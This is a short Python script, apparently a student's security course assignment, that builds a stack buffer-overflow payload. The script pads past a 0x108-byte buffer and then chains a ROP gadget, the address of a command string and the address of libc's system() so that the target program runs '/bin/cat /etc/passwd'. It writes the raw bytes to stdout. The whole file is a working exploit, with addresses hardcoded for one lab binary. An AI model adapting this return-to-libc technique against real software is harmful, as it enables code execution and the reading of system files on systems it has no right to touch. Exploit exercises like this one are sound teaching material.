#!/usr/bin/env python3

# malicious_input3.py
# I pledge my honor that I have abided by the Stevens Honor System.
#   Justin Ho

import sys

oflow   = b'A' * 0x108
string  = b"/bin/cat /etc/passwd\0"

# address of the top of the buffer
buffer_start = 0x7fffffffe210

# string is offset by 0x108 + 24 bytes from buffer_start
string_addr = buffer_start + 0x108 + 24

# address of the gadget used (loads string into rdi)
gadget_addr = 0x400803

# address of system
system_addr = 0x7ffff7a523a0

frames = [
    # gadget_addr, string_addr, system_addr
    [gadget_addr.to_bytes(8, byteorder='little'),
     string_addr.to_bytes(8, byteorder='little'),
     system_addr.to_bytes(8, byteorder='little')]
] 

exploit = bytearray(oflow)

for frame in frames:
    for item in frame:
        exploit.extend(item)

exploit.extend(string)
exploit.extend(b'\n')

sys.stdout.buffer.write(exploit)
